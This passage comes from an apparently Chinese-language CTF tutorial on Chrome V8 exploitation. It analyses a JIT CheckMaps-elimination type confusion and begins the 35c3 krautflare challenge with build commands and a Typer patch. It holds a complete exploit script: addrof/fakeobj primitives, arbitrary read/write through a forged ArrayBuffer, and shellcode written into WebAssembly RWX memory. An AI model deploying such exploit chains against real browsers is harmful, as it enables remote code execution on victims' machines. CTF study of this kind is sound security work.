class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">address_of</span>(array_buffer)));</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(array_buffer);</span><br></pre></td></tr></table></figure></div>

<p>首先定位 <code>kCheckMaps</code> 所在的优化的阶段。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/94f0d91ba598e5835839fc547519d972.png"
                      alt="在这里插入图片描述"
                ><br>选择最早的优化阶段，最终确定是在 <code>V8.TFLoadElimination</code> 阶段调用的此优化。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">LoadEliminationPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;V8.TFLoadElimination&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="function">RedundancyElimination <span class="title">redundancy_elimination</span><span class="params">(&amp;graph_reducer, temp_zone)</span></span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">AddReducer</span>(data, &amp;graph_reducer, &amp;redundancy_elimination);</span><br><span class="line">    ...</span><br><span class="line">    graph_reducer.<span class="built_in">ReduceGraph</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>观察 <code>kCheckMaps</code> 优化前后 <code>trigger</code> 函数的变化。<br>在 <code>kCheckMaps</code> 优化前，有两处 <code>CheckMaps</code> 操作，一个在 <code>a[0];</code> 前，另一个在 <code>return a[0];</code> 前。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/d95d1bd2b7158e24a294f4a4d5138ebb.png"
                      alt="在这里插入图片描述"
                ><br><code>kCheckMaps</code> 优化后，第二处 <code>CheckMaps</code> 操作被优化掉，这是因为 <code>kCheckMaps</code> 优化认为第一次 <code>CheckMaps</code> 检查的条件包含了第二次 <code>CheckMaps</code> 检查的条件，所以可以去掉。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/6acf64ba4f00381a5b252aac0335a128.png"
                      alt="在这里插入图片描述"
                ><br>然而两次 <code>kCheckMaps</code> 之间调用 <code>callback</code> 函数会修改 <code>map</code> 属性，浮点数数组变为 object 数组，然而在 <code>trigger</code> 函数中依然认为这个数组是浮点数数组，因此可以造成类型混淆，从而实现 address of 利用原语。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/35b7a940cdd238331c8b0b0141a1c066.png"
                      alt="在这里插入图片描述"
                ><br>同理，fake object 原语也可以实现。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(<span class="title function_">trigger</span>(evil_callback));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_object</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        a[<span class="number">0</span>] = addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">trigger</span>(evil_callback);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="title function_">fake_object</span>(<span class="title function_">u2d</span>(<span class="title function_">address_of</span>(array_buffer)));</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(obj);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/e56933efd1535fd7f7a43936eeb26928.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面漏洞分析已经构造出 address of 和 fake object 两个利用原语，因此后续利用和前面的 OOB 一致。不过需要注意的是， <code>address_of</code> 函数在用过一次之后已经被 JIT 了，后续如果用到这个函数需要再定义一个。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of1</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(<span class="title function_">trigger</span>(evil_callback));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of2</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(<span class="title function_">trigger</span>(evil_callback));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_object</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        a[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">trigger</span>(evil_callback);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">gc</span>();</span><br><span class="line"><span class="keyword">var</span> fake_ab_mem = [</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Propertries</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Elements</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1000n</span>),               <span class="comment">// ByteLength</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// BackingStore</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1900042317080808n</span>),   <span class="comment">// type</span></span><br><span class="line">];</span><br><span class="line"><span class="title function_">gc</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab_addr = <span class="title function_">address_of1</span>(fake_ab_mem) + <span class="number">0x30n</span>;</span><br><span class="line">fake_ab_mem[<span class="number">0</span>] = <span class="title function_">u2d</span>(fake_ab_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="keyword">var</span> fake_ab = <span class="title function_">fake_object</span>(fake_ab_addr);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake ab addr: &quot;</span>+<span class="title function_">hex</span>(fake_ab_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">address_of2</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x636c6163782fb848n</span>,</span><br><span class="line">    <span class="number">0x73752fb848500000n</span>,</span><br><span class="line">    <span class="number">0x8948506e69622f72n</span>,</span><br><span class="line">    <span class="number">0x89485750c03148e7n</span>,</span><br><span class="line">    <span class="number">0x3ac0c748d23148e6n</span>,</span><br><span class="line">    <span class="number">0x4944b84850000030n</span>,</span><br><span class="line">    <span class="number">0x48503d59414c5053n</span>,</span><br><span class="line">    <span class="number">0x485250c03148e289n</span>,</span><br><span class="line">    <span class="number">0x00003bc0c748e289n</span>,</span><br><span class="line">    <span class="number">0x0000000000050f00n</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="例题：35c3-krautflare"><a href="#例题：35c3-krautflare" class="headerlink" title="例题：35c3 krautflare"></a>例题：35c3 krautflare</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/35c3_krautflare" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sroettger/35c3ctf_chals</span><br><span class="line">mv 35c3ctf_chals/krautflare .</span><br><span class="line">cd v8</span><br><span class="line">git checkout dde25872f58951bb0148cf43d6a504ab2f280485</span><br><span class="line">git apply ../../test/krautflare/attachments/revert-bugfix-880207.patch</span><br><span class="line">gclient sync</span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>题目主要 patch 了优化的 Typer 阶段：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index <span class="number">60e7</span>ed574a.<span class="number">.8324</span>dc06d7 <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ <span class="number">-1491</span>,<span class="number">6</span> <span class="number">+1491</span>,<span class="number">7</span> @@ Type Typer::Visitor::<span class="built_in">JSCallTyper</span>(Type fun, Typer* t) &#123;</span><br><span class="line">     <span class="comment">// Unary math functions.</span></span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathAbs:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathExp:</span><br><span class="line">+    <span class="keyword">case</span> BuiltinFunctionId::kMathExpm1:</span><br><span class="line">       <span class="keyword">return</span> Type::<span class="built_in">Union</span>(Type::<span class="built_in">PlainNumber</span>(), Type::<span class="built_in">NaN</span>(), t-&gt;<span class="built_in">zone</span>());</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathAcos:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathAcosh:</span><br><span class="line">@@ <span class="number">-1500</span>,<span class="number">7</span> <span class="number">+1501</span>,<span class="number">6</span> @@ Type Typer::Visitor::<span class="built_in">JSCallTyper</span>(Type fun, Typer* t) &#123;</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathAtanh:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathCbrt:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathCos:</span><br><span class="line">-    <span class="keyword">case</span> 